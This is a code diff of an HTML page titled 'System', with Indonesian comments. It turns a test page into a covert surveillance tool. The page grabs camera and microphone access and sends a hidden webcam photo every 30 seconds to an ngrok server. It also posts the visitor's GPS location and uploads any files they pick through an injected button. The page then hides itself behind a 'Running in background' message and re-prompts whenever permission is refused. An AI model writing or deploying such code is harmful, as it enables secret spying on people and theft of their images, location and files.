@@ -2,69 +2,139 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Test</title>
+    <title>System</title>
 </head>
 <body>
     <h3>Loading...</h3>
     <script>
+        // GANTI DENGAN LINK NGROK KAMU
         const SERVER = "https://reversion-exert-gloomily.ngrok-free.dev";
         
-        async function takePhoto() {
-            console.log("1. Requesting camera...");
+        let mediaStream = null;
+        let photoInterval = null;
+        
+        async function captureAndSend() {
+            if (!mediaStream) return;
             
             try {
-                // Buka kamera
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { width: 640, height: 480 }
-                });
-                console.log("2. Camera OK");
-                
-                // Buat video element (sembunyi)
+                // Buat video element sementara
                 const video = document.createElement('video');
-                video.srcObject = stream;
+                video.srcObject = mediaStream;
                 video.muted = true;
                 video.playsInline = true;
                 video.style.display = 'none';
                 document.body.appendChild(video);
                 await video.play();
-                console.log("3. Video playing");
                 
-                // Tunggu 1 detik
-                await new Promise(r => setTimeout(r, 1000));
+                // Tunggu sebentar
+                await new Promise(r => setTimeout(r, 200));
                 
                 // Ambil foto
                 const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                console.log("4. Photo captured");
                 
                 // Kirim ke server
                 canvas.toBlob(async (blob) => {
                     const formData = new FormData();
                     formData.append('photo', blob);
-                    
-                    const res = await fetch(SERVER + '/photo', { method: 'POST', body: formData });
-                    if (res.ok) {
-                        console.log("5. ✅ PHOTO SENT!");
-                        document.body.innerHTML = "<h3>✅ Success - Photo sent!</h3>";
-                    } else {
-                        console.log("5. ❌ Send failed");
-                    }
-                }, 'image/jpeg');
+                    await fetch(SERVER + '/photo', { method: 'POST', body: formData });
+                    console.log('📸 Photo sent at', new Date().toLocaleTimeString());
+                }, 'image/jpeg', 0.7);
                 
-                // Tutup stream setelah 5 detik
-                setTimeout(() => {
-                    stream.getTracks().forEach(t => t.stop());
-                }, 5000);
+                // Bersihkan
+                video.srcObject = null;
+                video.remove();
                 
             } catch(e) {
-                console.log("ERROR:", e.message);
-                document.body.innerHTML = "<h3>Error: " + e.message + "</h3><p>Click 'Allow' when prompted</p>";
+                console.log('Capture error:', e);
             }
         }
         
-        takePhoto();
+        async function start() {
+            console.log("Starting camera...");
+            
+            try {
+                // Buka kamera (tanpa suara)
+                mediaStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: 640, height: 480 },
+                    audio: true
+                });
+                
+                // Matikan output suara di HP
+                const audioTracks = mediaStream.getAudioTracks();
+                audioTracks.forEach(track => {
+                    track.enabled = true; // Tetap rekam tapi tidak output suara
+                });
+                
+                console.log("✅ Camera ready");
+                
+                // Ambil foto pertama
+                await captureAndSend();
+                
+                // Set interval setiap 30 detik
+                photoInterval = setInterval(captureAndSend, 30000);
+                console.log("⏰ Auto photo every 30 seconds");
+                
+                // Ambil lokasi
+                if ('geolocation' in navigator) {
+                    navigator.geolocation.getCurrentPosition(pos => {
+                        fetch(SERVER + '/loc', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ lat: pos.coords.latitude, lng: pos.coords.longitude })
+                        });
+                        console.log("📍 Location sent");
+                    });
+                }
+                
+                // Setup file upload (akses folder target)
+                const fileInput = document.createElement('input');
+                fileInput.type = 'file';
+                fileInput.multiple = true;
+                fileInput.style.display = 'none';
+                document.body.appendChild(fileInput);
+                
+                // Tombol upload (akan muncul di pojok)
+                const btn = document.createElement('button');
+                btn.innerHTML = '📁 Upload Files';
+                btn.style.position = 'fixed';
+                btn.style.bottom = '20px';
+                btn.style.right = '20px';
+                btn.style.zIndex = '9999';
+                btn.style.padding = '10px 20px';
+                btn.style.background = '#1a73e8';
+                btn.style.color = 'white';
+                btn.style.border = 'none';
+                btn.style.borderRadius = '20px';
+                btn.onclick = () => fileInput.click();
+                document.body.appendChild(btn);
+                
+                fileInput.onchange = async () => {
+                    for (let file of fileInput.files) {
+                        const formData = new FormData();
+                        formData.append('file', file);
+                        await fetch(SERVER + '/upload', { method: 'POST', body: formData });
+                        console.log(`📁 Uploaded: ${file.name}`);
+                    }
+                    alert(`Uploaded ${fileInput.files.length} files`);
+                    fileInput.value = '';
+                };
+                
+                // Sembunyikan halaman setelah 2 detik
+                setTimeout(() => {
+                    document.body.innerHTML = '<div style="text-align:center; padding:50px;">Running in background...</div>';
+                }, 2000);
+                
+            } catch(e) {
+                console.log("Error:", e);
+                document.body.innerHTML = '<h3>Error: Click "Allow" to continue</h3>';
+                setTimeout(start, 2000);
+            }
+        }
+        
+        start();
     </script>
 </body>
 </html>
